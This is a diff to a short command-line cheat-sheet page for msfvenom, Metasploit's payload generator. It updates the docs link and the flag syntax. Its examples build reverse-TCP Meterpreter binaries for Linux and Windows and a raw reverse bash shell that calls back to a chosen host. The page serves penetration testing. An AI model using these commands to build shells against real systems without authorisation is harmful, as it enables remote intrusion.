@@ -1,28 +1,28 @@
 # msfvenom
 
 > Manually generate payloads for metasploit.
-> More information: <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>.
+> More information: <https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html>.
 
 - List payloads:
 
-`msfvenom -l payloads`
+`msfvenom {{[-l|--list]}} payloads`
 
 - List formats:
 
-`msfvenom -l formats`
+`msfvenom {{[-l|--list]}} formats`
 
 - Show payload options:
 
-`msfvenom -p {{payload}} --list-options`
+`msfvenom {{[-p|--payload]}} {{payload}} --list-options`
 
 - Create an ELF binary with a reverse TCP handler:
 
-`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f elf -o {{path/to/binary}}`
+`msfvenom {{[-p|--payload]}} linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} {{[-f|--format]}} elf {{[-o|--out]}} {{path/to/binary}}`
 
 - Create an EXE binary with a reverse TCP handler:
 
-`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f exe -o {{path/to/binary.exe}}`
+`msfvenom {{[-p|--payload]}} windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} {{[-f|--format]}} exe {{[-o|--out]}} {{path/to/binary.exe}}`
 
 - Create a raw Bash with a reverse TCP handler:
 
-`msfvenom -p cmd/unix/reverse_bash LHOST={{local_ip}} LPORT={{local_port}} -f raw`
+`msfvenom {{[-p|--payload]}} cmd/unix/reverse_bash LHOST={{local_ip}} LPORT={{local_port}} {{[-f|--format]}} raw`
